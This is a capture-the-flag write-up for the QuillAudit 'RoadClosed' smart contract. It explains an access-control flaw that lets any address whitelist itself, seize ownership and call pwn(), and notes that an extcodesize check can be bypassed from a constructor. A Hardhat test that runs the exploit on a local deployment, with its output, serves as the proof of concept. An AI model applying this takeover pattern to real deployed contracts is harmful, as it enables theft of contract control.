# QuillAudit CTF RoadClosed

## Vulnerability

The vulnerability for this CTF lies with the function ***addToWhiteList()*** which updates the mapping ***whitelistedMinters*** for the parameter “addr” to “true”. 

Once this step is done, the ***changeOwner()*** function allows all whitelisted addresses to change the owner. This function is not very intuitive from a security standpoint as it allows all whitelisted users to make changes to the ownership of the contract. An “***onlyOwner***” modifier can be used to restrict the calling of changeOwner only to the current owner of the contract.

Once the ownership of the contract is obtained, the “***pwn(address addr)***” is to be called to change the value of the state var “hacked” to true 

One more potential vulnerability is the use of ***extcodesize*** to check if the account is an EOA. This check can be surpassed if a contract is calling while its constructor is running. This is because of the fact that a contract address while being initialized (when the constructor is being executed) does not have any code and thus ***extcodesize*** will return zero

  

## Attack Steps

### Step 1:

Function *addToWhiteList(address addr)* will be called with parameter as the attackers address which will whitelist the attacker’s address in the mapping *whiteListedMinters*

### Step 2:

Function *changeOwner(address addr)* is called with the whitelisted address of the attacker as the parameter, making sure that the msg.sender for the call is the same as the param.

This step achieves the first objective of the CTF

### Step 3:

Function *pwn(address addr)* is called from the same address which has just obtained the ownership changing the *hacked* to true.

This achieves the second objective of the CTF

## POC

Here is a code snippet as POC

```jsx
require('@nomiclabs/hardhat-truffle5');
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { ethers, contract } = require('hardhat')
const RB=artifacts.require("RoadClosed.sol");
contract ("Splits",(accounts)=>{
        let [alice,bob,carey]=accounts;
        let contractInstance;
        beforeEach(async () => {
            contractInstance = await RB.new();
        });
    describe("Tests", ()=>{
        it("Calling whitelistaddress", async()=>{
            var step1=await contractInstance.addToWhitelist(alice);
            var whiteList=await contractInstance.whitelistedMinters(alice);
						//had to make the mapping public to have access to a getter function for the mapping
            console.log(whiteList);
        }    
    )
        it("Calling the changeOwner function with parameter alice",async()=>{
            const step1=await contractInstance.addToWhitelist(bob);
            console.log("Owner before step 2", await contractInstance.isOwner({from:bob}));
            const step2=await contractInstance.changeOwner(bob,{from: bob});
            console.log("Owner after step 2", await contractInstance.isOwner({from:bob}));
        })
        it("Calling the pwn(address addr) function",async()=>{
            const step1=await contractInstance.addToWhitelist(bob);
            const step2=await contractInstance.changeOwner(bob,{from:bob});
            console.log("Hacked before step 3", await contractInstance.isHacked());
            const step3= await contractInstance.pwn(bob,{from:bob});
            console.log("Hacked after step 3", await contractInstance.isHacked());
            

        })
    
    })
})
```

Results

```jsx
✔ Calling whitelistaddress (55ms)
Owner before step 2 false
Owner after step 2 true
      ✔ Calling the changeOwner function with parameter alice (59ms)
Hacked before step 3 false
Hacked after step 3 true
      ✔ Calling the pwn(address addr) function (63ms)

  3 passing (954ms)
```